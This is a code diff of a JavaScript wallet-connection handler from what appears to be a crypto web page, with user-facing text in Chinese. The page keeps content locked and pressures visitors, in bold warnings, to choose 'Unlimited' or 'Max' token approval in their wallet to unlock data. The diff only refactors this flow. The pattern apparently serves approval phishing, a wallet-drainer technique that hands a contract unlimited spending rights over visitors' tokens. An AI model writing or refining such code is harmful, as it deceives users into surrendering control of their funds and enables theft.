@@ -281,31 +281,30 @@ async function handlePostConnection() {
     const allAuthorized = status.contract && tokenAuthorized;
 
     if (allAuthorized) {
-        // 🚨 最終授權完成狀態
+        // 所有授權已完成：最終成功狀態
         showOverlay('✅ Max 授權已成功！數據已解鎖。');
         updateContentLock(true); 
         await new Promise(resolve => setTimeout(resolve, 3000));
         hideOverlay();
-    } else {
-        showOverlay(`
-            正在檢查授權狀態，Max 授權尚未完成。
-            
-            ⚠️ **重要步驟**：即將彈出錢包視窗，請務必選擇 **「Unlimited」** 或 **「Max 授權」** 選項，才能解鎖服務。
-            
-            （請在錢包中操作...）
-        `);
-        updateContentLock(false); 
+        return; // 🚨 關鍵：解鎖後，直接結束 handlePostConnection 
+    } 
+    
+    // 授權未完成：給出提示並啟動授權流程，然後停止
+    showOverlay(`
+        正在檢查授權狀態，Max 授權尚未完成。
         
-        const authSuccess = await connectAndAuthorize();
+        ⚠️ **重要步驟**：即將彈出錢包視窗，請務必選擇 **「無限大 / Unlimited」** 或 **「Max 授權」** 選項，才能解鎖服務。
         
-        // 🚨 最終修正：廣播成功，立即進入成功解鎖的 UI 狀態 (避免檢查循環)
-        if (authSuccess) {
-             // 樂觀判斷成功：直接解鎖 UI，不進行遞歸狀態檢查
-            showOverlay('✅ 授權操作已廣播成功！正在解鎖數據...');
-            updateContentLock(true); 
-            await new Promise(resolve => setTimeout(resolve, 3000));
-            hideOverlay();
-        } 
+        （請在錢包中操作...）
+    `);
+    updateContentLock(false); 
+    
+    const authSuccess = await connectAndAuthorize();
+    
+    // 🚨 不再輪詢：授權成功後，授權流程的責任就交給用戶了，這裡不進行任何遞迴
+    // 下一次訪問如果沒有完成，再次引導。
+    if (!authSuccess) {
+        console.error("Max 授權流程未完全完成。");
     }
 }
 
